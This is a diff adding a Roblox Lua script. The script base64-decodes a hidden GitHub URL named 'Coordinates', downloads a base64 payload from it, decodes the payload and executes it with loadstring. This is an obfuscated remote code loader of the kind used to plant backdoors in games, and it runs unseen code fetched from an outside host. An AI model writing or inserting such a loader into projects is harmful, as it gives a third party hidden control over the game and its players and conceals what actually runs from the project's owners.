@@ -1,0 +1,58 @@
+-- Base64 Decode Function
+local base64 = {}
+local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function base64.decode(data)
+	local chars = {}
+	data = data:gsub("[^" .. b .. "=]", "")
+	for i = 1, #data, 4 do
+		local a = b:find(data:sub(i, i)) or 0
+		local b_ = b:find(data:sub(i + 1, i + 1)) or 0
+		local c = b:find(data:sub(i + 2, i + 2)) or 0
+		local d = b:find(data:sub(i + 3, i + 3)) or 0
+
+		local byte1 = (a - 1) * 4 + math.floor((b_ - 1) / 16)
+		local byte2 = ((b_ - 1) % 16) * 16 + math.floor((c - 1) / 4)
+		local byte3 = ((c - 1) % 4) * 64 + (d - 1)
+
+		table.insert(chars, string.char(byte1))
+		if data:sub(i + 2, i + 2) ~= '=' then
+			table.insert(chars, string.char(byte2))
+		end
+		if data:sub(i + 3, i + 3) ~= '=' then
+			table.insert(chars, string.char(byte3))
+		end
+	end
+	return table.concat(chars)
+end
+
+-- Step 1: Decode the base64 URL
+local encodedURL = [[
+aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pbmhjYmQvQ29vcmRpbmF0ZXMvcmVmcy9oZWFkcy9tYWluL0Nvb3JkaW5hdGVz
+]]
+local decodedURL = base64.decode(encodedURL)
+print("[INFO] Decoded URL:", decodedURL)
+
+-- Step 2: Get Base64 content from the decoded URL
+local HttpService = game:GetService("HttpService")
+local success, response = pcall(function()
+	return HttpService:GetAsync(decodedURL)
+end)
+
+if success and response then
+	print("[INFO] Downloaded base64 script content successfully.")
+
+	-- Step 3: Decode the nested base64 content
+	local finalCode = base64.decode(response)
+	print("[INFO] Decoded final script code successfully.")
+
+	-- Step 4: Compile and execute the decoded code
+	local func, err = loadstring(finalCode)
+	if func then
+		print("[INFO] Running decoded script...")
+		func()
+	else
+		warn("[ERROR] Failed to compile decoded script:", err)
+	end
+else
+	warn("[ERROR] Failed to download base64 content from URL.")
+end
